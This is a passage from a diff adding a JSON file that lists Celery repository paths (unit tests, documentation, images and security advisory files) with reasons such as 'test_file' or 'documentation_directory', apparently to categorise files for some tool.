+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_elasticsearch.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_filesystem.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_mongodb.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_redis.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_rpc.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_s3.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/bin/test_multi.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_concurrency.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_eventlet.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_gevent.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_pool.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_prefork.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_solo.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_thread.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/contrib/proj/contents.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "t/unit/contrib/test_abortable.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/contrib/test_migrate.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/contrib/test_pytest.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/contrib/test_rdb.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/contrib/test_sphinx.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/events/test_cursesmon.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/events/test_events.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/events/test_snapshot.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/events/test_state.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/fixups/test_django.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/security/test_certificate.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/security/test_key.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/security/test_security.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/security/test_serialization.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_canvas.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_chord.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_context.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_result.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_states.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_tasks.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_trace.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/test_canvas.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_collections.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_debug.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_deprecated.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_dispatcher.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_functional.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_graph.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_imports.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_local.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_nodenames.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_objects.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_pickle.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_platforms.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_saferepr.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_serialization.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_sysinfo.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_term.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_text.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_threads.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_time.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_timer2.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_utils.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_autoscale.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_bootsteps.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_components.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_consumer.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_control.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_heartbeat.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_loops.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_request.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_revoke.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_state.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_strategy.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_worker.py",
+        "reason": "test_file"
+      }
+    ],
+    "fixed": [
+      {
+        "path": ".github/ISSUE_TEMPLATE.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Bug-Report.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Documentation-Bug-Report.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Enhancement.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Feature-Request.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Major-Version-Release-Checklist.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Minor-Version-Release-Checklist.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/PULL_REQUEST_TEMPLATE.md",
+        "reason": "documentation"
+      },
+      {
+        "path": "CONTRIBUTING.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "Changelog.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "LICENSE",
+        "reason": "documentation"
+      },
+      {
+        "path": "README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "celery/contrib/testing/__init__.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/contrib/testing/app.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/contrib/testing/manager.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/contrib/testing/mocks.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/contrib/testing/tasks.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/contrib/testing/worker.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/utils/dispatch/LICENSE.python",
+        "reason": "documentation"
+      },
+      {
+        "path": "celery/utils/dispatch/license.txt",
+        "reason": "documentation"
+      },
+      {
+        "path": "docker/docs/Dockerfile",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docker/docs/start",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/AUTHORS.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/Makefile",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/THANKS",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/_ext/celerydocs.py",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/_static/.keep",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/_templates/sidebardonations.html",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/changelog.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/community.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/conf.py",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/configuration.html",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/contributing.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/copyright.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/django/first-steps-with-django.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/django/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/faq.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/backends-and-brokers/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/backends-and-brokers/rabbitmq.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/backends-and-brokers/redis.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/backends-and-brokers/sqs.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/first-steps-with-celery.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/introduction.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/next-steps.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/resources.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/glossary.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-1.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.2.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.3.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.4.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.5.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-3.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-3.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-4.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-4.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-4.2.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-4.3.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-4.4.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-5.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-5.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-2.5.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-3.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-3.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-4.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-4.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-4.2.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-4.3.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-4.4.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-5.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-5.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/celery-banner-small.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/celery-banner.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/celery_128.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/celery_512.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/celeryevshotsm.jpg",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/dashboard.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/favicon.ico",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/monitor.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/result_graph.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/worker_graph_full.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/includes/installation.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/includes/introduction.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/includes/resources.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/app-overview.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/deprecation.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/guide.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/protocol.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery._state.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.app.annotations.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.app.routes.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.app.trace.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.arangodb.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.asynchronous.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.azureblockblob.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.base.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.cache.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.cassandra.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.consul.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.cosmosdbsql.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.couchbase.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.couchdb.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.database.models.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.database.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.database.session.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.dynamodb.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.elasticsearch.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.filesystem.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.mongodb.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.redis.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.rpc.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.s3.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.base.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.eventlet.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.gevent.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.prefork.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.solo.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.thread.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.events.cursesmon.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.events.dumper.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.events.snapshot.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.platforms.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.security.certificate.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.security.key.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.security.serialization.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.security.utils.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.abstract.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.collections.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.deprecated.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.dispatch.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.dispatch.signal.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.functional.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.graph.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.imports.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.iso8601.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.log.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.nodenames.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.objects.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.saferepr.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.serialization.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.sysinfo.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.term.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.text.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.threads.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.time.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.timer2.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.autoscale.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.components.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.control.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.heartbeat.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.loops.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.pidbox.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/make.bat",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.amqp.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.autoretry.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.backends.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.builtins.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.control.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.defaults.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.events.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.log.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.registry.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.task.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.utils.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.apps.beat.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.apps.multi.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.apps.worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.beat.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.base.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.beat.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.call.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.celery.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.control.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.events.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.graph.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.list.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.logtool.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.migrate.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.multi.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.purge.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.result.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.shell.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.upgrade.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bootsteps.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.abortable.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.migrate.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.pytest.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.rdb.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.sphinx.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.testing.app.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.testing.manager.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.testing.mocks.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.testing.worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.events.dispatcher.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.events.event.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.events.receiver.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.events.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.events.state.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.exceptions.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.loaders.app.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.loaders.base.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.loaders.default.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.loaders.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.result.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.schedules.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.security.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.signals.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.states.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.utils.debug.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.agent.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.connection.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.consumer.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.control.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.events.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.gossip.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.heart.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.mingle.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.tasks.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.request.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.state.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.strategy.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/cli.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/sec/CELERYSA-0001.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/sec/CELERYSA-0002.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/sec/CELERYSA-0003.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/spelling_wordlist.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/templates/readme.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/tutorials/daemonizing.html",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/tutorials/debugging.html",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/tutorials/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/tutorials/task-cookbook.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/application.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/calling.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/canvas.rst",
+        "reason": "documentation_directory"
+      },
+      {
